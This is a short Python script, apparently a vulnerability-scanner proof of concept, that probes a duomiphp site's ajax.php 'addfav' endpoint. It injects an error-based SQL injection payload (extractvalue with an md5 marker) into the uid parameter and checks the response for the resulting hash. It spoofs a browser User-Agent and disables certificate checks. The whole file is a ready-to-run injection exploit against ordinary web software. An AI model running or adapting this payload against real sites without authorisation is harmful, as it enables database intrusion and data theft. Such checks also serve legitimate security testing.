import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(2000000005)))"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if "fc9bdfb86bae5c322bae5acd78760935" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
